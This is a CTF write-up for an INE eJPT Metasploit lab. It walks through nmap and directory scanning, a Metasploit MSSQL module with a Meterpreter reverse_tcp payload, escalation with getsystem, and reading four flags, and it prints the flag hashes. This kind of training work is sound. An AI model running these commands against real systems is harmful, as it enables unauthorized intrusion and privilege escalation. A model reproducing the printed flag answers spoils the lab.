# INE eJPT — Host & Network Penetration Testing: The Metasploit Framework CTF 1

**Course:** INE / eJPT — Host & Network Penetration Testing  
**Lab:** The Metasploit Framework CTF 1  
**Author:** Zeliha Zengin

---

## Lab Environment

GUI access to a Kali machine is provided. Target: `target.ine.local` (10.3.30.19), added to `/etc/hosts`.

- **Flag 1:** Gain access to the `MSSQLSERVER` account and read the first flag.
- **Flag 2:** Locate the second flag in the Windows configuration folder.
- **Flag 3:** Find the flag in the system directory — it hints at the final flag.
- **Flag 4:** Investigate the Administrator directory.

> **Note:** Flag format is `FLAG#_<MD5>` — submit only the hash, without the underscore or prefix.

**Tools used:** Nmap · Metasploit · MSSQL

> *All work is performed against an authorized INE training lab for eJPT exam preparation.*

## Reconnaissance

```bash
cat /etc/hosts
nmap -sV -sC -Pn -A -p- 10.3.30.19
dirb http://10.3.30.19
gobuster dir -u http://10.3.30.19 -w /usr/share/wordlists/dirb/common.txt
```

Nmap reveals a Microsoft SQL Server instance. Exploit it with Metasploit.

## Flag 1 — MSSQL → Meterpreter

Search for the MSSQL payload-delivery module. Set an **x64** Meterpreter payload (an x86 payload will fail to open a session here):

```bash
msfconsole
search MSSQL 2012
use 0
show options
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.3.30.19
exploit
```

Once the Meterpreter session opens, drop to a shell and read the flag from the C: drive:

```bash
shell
whoami
systeminfo
whoami /priv
cd C:\
dir
type flag1.txt
```

> 🏁 **FLAG 1:** `read from the `type flag1.txt` output`

## Flag 2 — Windows config folder (needs SYSTEM)

The `config` folder is protected, so escalate first with `getsystem`, then read it:

```bash
getsystem
shell
cd C:\Windows\System32\config
type flag2.txt
```

> 🏁 **FLAG 2:** `27b92c32454a4da8a1218b13fa0cdb36`

## Flag 3 — Hunt the system directory

Recursively search `System32` for text files, then read the hinted flag file under `drivers\etc`:

```bash
dir C:\Windows\System32\*.txt /s /b
type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
```

> 🏁 **FLAG 3:** `84ec881c385b4b7c941adfa9eec60585`

## Flag 4 — Administrator directory

```bash
cd C:\Users\Administrator\Desktop
dir
type flag4.txt
```

> 🏁 **FLAG 4:** `05c9aaafde7749d9983ec2c5644216fc`

## Summary

| Flag | Technique |
| --- | --- |
| 1 | MSSQL payload module (x64 Meterpreter) → read C:\flag1.txt |
| 2 | `getsystem` → read System32\config |
| 3 | Recursive `.txt` search → drivers\etc flag |
| 4 | Administrator Desktop |

### Key Takeaways

- Match the payload architecture to the target — an x86 payload on x64 often fails to stage.
- `getsystem` is the fastest route from a service account to `NT AUTHORITY\SYSTEM`.
- `dir C:\...\*.txt /s /b` is a quick way to hunt flags across a Windows tree.
- On Windows use `type` to read files and `dir` to list them.

---

*Write-up by Zeliha Zengin · eJPT preparation*